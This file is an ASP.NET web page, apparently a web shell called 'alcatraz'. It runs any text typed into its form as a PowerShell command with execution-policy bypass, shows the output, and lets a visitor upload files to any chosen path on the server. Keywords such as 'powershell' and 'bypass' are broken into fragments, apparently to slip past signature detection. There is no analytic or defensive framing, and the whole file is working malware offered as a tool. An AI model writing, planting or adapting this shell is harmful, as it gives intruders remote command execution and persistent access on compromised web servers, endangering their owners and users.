<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>


<script Language="c#" runat="server">
protected override void OnInit(EventArgs e)
{

    output.Text = @"";

}

string zpxoasd(string mrg)
{

    ProcessStartInfo asd = new ProcessStartInfo();

    asd.FileName = "po"+"we"+"rsh"+"el"+"l.ex"+""+"e";

    asd.Arguments = "-no"+""+"ni"+""+"nter"+""+"ac"+""+"ti"+""+"ve " + "-ex"+""+"ecu"+""+"tio"+""+"npo"+""+"licy b"+""+"yp"+""+"a"+""+"ss " + mrg;


    asd.RedirectStandardOutput = true;

    asd.UseShellExecute = false;
	

    Process p = Process.Start(asd);

    StreamReader stmrdr = p.StandardOutput;
	

    string s = stmrdr.ReadToEnd();

    stmrdr.Close();

    return s;

}

void ps(object sender, System.EventArgs e)
{
    string option = console.Text.ToLower();
    if (option.Equals("cle"+""+"ar"))
    {
        output.Text = string.Empty;
        console.Text = string.Empty;
        console.Focus();
    }
    else
    {
        output.Text += "\nP"+""+"S"+""+"> " + console.Text + "\n" + zpxoasd(console.Text);
        console.Text = string.Empty;
        console.Focus();
    }

}

void asdop(string cmd)
{
    output.Text += "P"+""+"S"+""+"> " + "\n" + zpxoasd(cmd);
    console.Text = string.Empty;
    console.Focus();
}

void bs64e(object sender, System.EventArgs e)
{
    asdop(console.Text);


}
protected void uplc(object sender, EventArgs e)
{
    if (upload.HasFile)
    {
        try
        {
            string filename = Path.GetFileName(upload.FileName);
            upload.SaveAs(console.Text + "\\" + filename);
            output.Text = "Fi"+""+"le upl"+""+"oa"+""+"ded to: " + console.Text + "\\" + filename;
        }
        catch (Exception ex)
        {
            output.Text = "U"+""+"plo"+""+"ad st"+""+"atu"+""+"s: Th"+""+"e file co"+""+"uld n"+""+"ot b"+""+"e uploa"+""+"ded. Th"+""+"e fo"+""+"llow"+""+"in"+""+"g err"+""+"or oc"+""+"cu"+""+"re"+""+"d: " + ex.Message;
        }
    }
}

</script>
<HTML>
<HEAD>
<title>alcatraz</title>
</HEAD> 
<body bgcolor="#808080">
<div>
<form id="Form1" method="post" runat="server" style="background-color: #808080">
    <div style="text-align:center; resize:vertical">
    <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#012456" ForeColor="White" style="height: 526px; width: 891px;" ReadOnly="True"></asp:TextBox>
    <asp:TextBox ID="console" runat="server" BackColor="#012456" ForeColor="Yellow" Width="891px" TextMode="MultiLine" Rows="1" onkeydown="if(event.keyCode == 13) document.getElementById('cmd').click()" Height="23px" AutoCompleteType="None"></asp:TextBox>
    

    </div>
    <div style="width: 1100px; text-align:center">
        <asp:Button ID="cmd" runat="server" Text="Submit" OnClick="ps" />
        <asp:FileUpload ID="upload" runat="server"/>
        <asp:Button ID="uploadbutton" runat="server" Text="Upload the File" OnClick="uplc" />
        <asp:Button ID="encode" runat="server" Text="Encode and Execute" OnClick="bs64e" />
    </div>
    
    </form>



 </div>
</body>
</HTML>